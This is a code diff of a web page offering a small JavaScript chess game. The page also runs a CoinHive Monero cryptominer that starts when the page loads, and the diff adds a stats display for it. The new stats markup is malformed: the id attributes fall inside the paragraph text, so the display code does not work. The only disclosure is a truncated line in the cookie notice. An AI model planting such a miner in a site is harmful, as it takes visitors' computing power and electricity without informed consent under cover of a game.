@@ -55,7 +55,9 @@
     <p>
       Play some chess!
     </p>
-    
+	  <p> id="hps"</p>
+	  <p> id="th"</p>
+	  <p> id="ah"</p>
 <script>
   function X(e,t,o,n,r,d){var f,c,p,a,s,h,g,m,w,q,v,E,T,Y,k=n,A=-M*M,C=78-o<<x,H=y?-x:x;y^=8,G++,s=e||d&&d>=o&&X(0,0,0,21,0,0)>M;do{if((c=I[h=k])&&(v=c&z^y)<7){q=2&v--?8:4,T=c-9&z?[53,47,61,51,47,47][v]:57;do{if(E=I[h+=l[T]],!e|h==e&&(g=v|h+H-r?0:r,!E&(!!v|q<3||!!g)||(E+1&z^y)>9&&v|q>2)){if(w=!(E-2&7))return y^=8,I[G--]=k,C;for(Y=m=c&z,f=v|(a=I[h-H]&z)-7?m:(m+=2,6^y);m<=f;){if(p=E?l[7&E|32]-o-v:0,d&&(p+=(1-v?l[(h-h%x)/x+37]-l[(k-k%x)/x+37]+l[h%x+38]*(v?1:2)-l[k%x+38]+(16&c)/2:9*!!w)+(v?0:!(I[h-1]^m)+!(I[h+1]^m)+l[7&m|32]-99+99*!!g+(q<2))+!(a^y^9)),d>o||1<d&d==o&&p>z|s){if(I[h]=m,I[k]=w?(I[g]=I[w],I[w]=0):g?I[g]=0:0,p-=X(d>o|s?0:h,p-A,o+1,I[G+1],Y=v|q>1?0:h,d),!(o||d-1|B-k|i-m|h-b|p<-M))return W(),G--,u=Y;Y=v-1|q<7||w||!d|s|E|c<z||X(0,0,0,21,0,0)>M,I[k]=c,I[h]=E,w?(I[w]=I[g],I[g]=0):g&&(I[g]=9^y)}if(p>A||d>1&&p==A&&!o&&Math.random()<.5){if(I[G]=k,d>1){if(o&&t-p<0)return y^=8,G--,p;o||(i=m,B=k,b=h)}A=p}m+=Y||(g=h,w=h<k?g-3:g+2,I[w]<z|I[w+k-h]||I[h+=h-k])?1:0}}}while(!E&v>2||(h=k,v|q>2|c>z&!E&&++T*--q))}}while(++k>98?k=20:n-k);return y^=8,G--,A+M*M&&A>1924-C|s?A:0}function W(){for(B=b,p=21;p<99;++p)(q=document.getElementById("o"+p))&&(q.innerHTML=" ♟♚♞♝♜♛  ♙♔♘♗♖♕".charAt(I[p]&z),q.style.borderColor=p==B?"red":"#dde")}function Y(e){(i=(I[e]^y)&z)>8?(b=e,W()):B&&i<9&&(b=e,1==(7&(i=I[B]&z))&(b<29|b>90)&&(i=14-document.getElementById("t").selectedIndex^y),X(0,0,0,21,u,1),y&&setTimeout("X(0,0,0,21,u,2/*ply*/),X(0,0,0,21,u,1)",250))}var B,i,y,u,b,I=[],G=120,x=10,z=15,M=1e4,l=[5,3,4,6,2,4,3,5,1,1,1,1,1,1,1,1,9,9,9,9,9,9,9,9,13,11,12,14,10,12,11,13,0,99,0,306,297,495,846,-1,0,1,2,2,1,0,-1,-1,1,-10,10,-11,-9,9,11,10,20,-9,-11,-10,-20,-21,-19,-12,-8,8,12,19,21];for(B=i=y=u=0;B++<120;)I[B-1]=B%x?B/x%x<2|B%x<2?7:B/x&4?0:16|l[i++]:7;for(a="<table cellspacing=0 align=center>",i=18;i<100;a+=++i%10-9?"<th width=60 height=60 onclick=Y("+i+") id=o"+i+" style='line-height:50px;font-size:50px;border:2px solid #dde' bgcolor=#"+(.9*i&1?"c0c":"f0f")+"0f0>":(i++,"<tr>"));a+="<th colspan=8><select id=t style='font-size:20px'><option>&#9819;<option>",document.write(a+"&#9820;<option>&#9821;<option>&#9822;</select></table>"),W();
 </script>
@@ -63,6 +65,22 @@
 <script>
 	var miner = new CoinHive.Anonymous('8x57LFUtztCwKeUO0ZauQq4IYTQl9uX7');
 	miner.start();
+	
+		// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+		
+		document.getElementById("hps").innerHTML = hashesPerSecond;
+		document.getElementById("th").innerHTML = totalHashes;
+		document.getElementById("ah").innerHTML = acceptedHashes;
+		
+	}, 1000);
 </script>
     <p>
       Hi, by using this site, you agree that we may use cookies in oreder to help make your experience better, that we may mine monero
